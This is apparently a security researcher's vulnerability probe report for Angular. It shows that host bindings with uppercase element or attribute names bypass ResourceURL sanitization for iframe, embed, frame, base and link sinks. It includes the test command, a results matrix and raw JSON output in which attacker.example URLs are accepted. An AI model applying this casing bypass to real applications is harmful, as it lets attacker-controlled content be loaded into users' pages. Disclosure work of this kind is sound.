# ResourceURL Host Binding Casing Matrix

Command:

```bash
orb -m ubuntu -u root chroot --userspec=carlosgomez:carlosgomez /mnt/machines/angularvm \
  /usr/bin/env HOME=/home/carlosgomez USER=carlosgomez LOGNAME=carlosgomez \
  PATH=/usr/local/bin:/usr/bin:/bin:/opt/node-v22.22.2/bin \
  pnpm --dir /home/carlosgomez/angular exec bazelisk test \
  //packages/core/test/acceptance:acceptance \
  --test_output=errors \
  --test_filter='resource URL host binding casing matrix probe'
```

The probe intentionally failed and printed a JSON matrix. It tested:

- sinks from `RESOURCE_MAP` / `RESOURCE_URL`: `iframe|src`, `embed|src`, `frame|src`,
  `object|data`, `object|codebase`, `base|href`, `link|href`, `script|src`,
  `script|href`, `script|xlink:href`
- casing: lowercase, uppercase tag, uppercase attribute, uppercase both
- binding mode: host `[attr.x]` and host `[x]`

## Summary

| Sink | Lowercase baseline | Uppercase tag | Uppercase attr | Uppercase both | Notes |
|---|---|---|---|---|---|
| `iframe|src` | throws `NG0904` | set | `[attr.SRC]` set; `[SRC]` no effective `src` | `[attr.SRC]` set; `[SRC]` no effective `src` | affected |
| `embed|src` | throws `NG0904` | set | `[attr.SRC]` set; `[SRC]` no effective `src` | `[attr.SRC]` set; `[SRC]` no effective `src` | affected |
| `frame|src` | throws `NG0904` | set | `[attr.SRC]` set; `[SRC]` no effective `src` | `[attr.SRC]` set; `[SRC]` no effective `src` | affected, obsolete element |
| `base|href` | throws `NG0904` | set | `[attr.HREF]` set; `[HREF]` no effective attr | `[attr.HREF]` set; `[HREF]` no effective attr | affected |
| `link|href` | throws `NG0904` | set | `[attr.HREF]` set; `[HREF]` no effective `href` | `[attr.HREF]` set; `[HREF]` no effective `href` | affected |
| `object|data` | throws `NG0904` | throws `NG0904` | throws `NG0904` | throws `NG0904` | protected |
| `object|codebase` | throws `NG0904` | throws `NG0904` | throws `NG0904` | throws `NG0904` | protected |
| `script|src` | not rendered | not rendered | not rendered | not rendered | no direct script escalation |
| `script|href` | not rendered | not rendered | not rendered | not rendered | no direct script escalation |
| `script|xlink:href` | not rendered | not rendered | not rendered | not rendered | no direct script escalation |

## Key Raw Examples

Affected `iframe|src`:

```json
{"sink":"iframe|src","case":"lower","mode":"attr","outcome":"throw","error":"NG0904: unsafe value used in a resource URL context ..."}
{"sink":"iframe|src","case":"upper-tag","mode":"attr","outcome":"set","attrValue":"http://attacker.example/iframe-src-attr.html","propValue":"http://attacker.example/iframe-src-attr.html"}
{"sink":"iframe|src","case":"upper-attr","mode":"attr","outcome":"set","attrValue":"http://attacker.example/iframe-src-attr.html","propValue":"http://attacker.example/iframe-src-attr.html"}
```

Affected `embed|src`:

```json
{"sink":"embed|src","case":"lower","mode":"attr","outcome":"throw","error":"NG0904: unsafe value used in a resource URL context ..."}
{"sink":"embed|src","case":"upper-tag","mode":"attr","outcome":"set","attrValue":"http://attacker.example/embed-src-attr.html","propValue":"http://attacker.example/embed-src-attr.html"}
{"sink":"embed|src","case":"upper-attr","mode":"attr","outcome":"set","attrValue":"http://attacker.example/embed-src-attr.html","propValue":"http://attacker.example/embed-src-attr.html"}
```

Protected `object|data`:

```json
{"sink":"object|data","case":"lower","mode":"attr","outcome":"throw","error":"NG0904: unsafe value used in a resource URL context ..."}
{"sink":"object|data","case":"upper-tag","mode":"attr","outcome":"throw","error":"NG0904: unsafe value used in a resource URL context ..."}
{"sink":"object|data","case":"upper-attr","mode":"attr","outcome":"throw","error":"NG0904: unsafe value used in a resource URL context ..."}
```

Not rendered `script|src`:

```json
{"sink":"script|src","case":"lower","mode":"attr","outcome":"not-rendered","attrValue":null,"propValue":null}
{"sink":"script|src","case":"upper-tag","mode":"attr","outcome":"not-rendered","attrValue":null,"propValue":null}
```

## Interpretation

The bug is broader than the original `iframe|src` PoC. It reaches at least five ResourceURL sinks
when a host binding uses either uppercase element spelling or uppercase attribute spelling:

- `iframe|src`
- `embed|src`
- `frame|src`
- `base|href`
- `link|href`

It does not currently reach direct `script` execution through render3 templates, and `object` sinks
remain protected in this probe.
